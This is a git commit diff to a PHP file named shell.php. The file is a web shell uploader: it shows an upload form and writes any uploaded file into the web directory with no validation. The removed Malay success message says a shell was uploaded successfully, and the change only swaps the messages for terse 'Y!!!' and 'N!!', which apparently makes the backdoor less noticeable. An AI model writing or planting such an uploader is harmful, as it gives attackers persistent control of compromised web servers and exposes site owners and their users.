2ad27cf42f9eae2e7ae3415dc7df54b8448323e9
nerrow <107047564+nerrowed@users.noreply.github.com>
2025-03-31 16:04:47 +0800

    Update shell.php

--- shell.php
+++ shell.php
@@ -3,7 +3,7 @@
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
-else { echo '<b>Korang Gagal Upload Shell Korang!!!</b><br><br>'; }
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Y!!!<b><br><br>'; }
+else { echo '<b>N!!</b><br><br>'; }
 }
 ?>
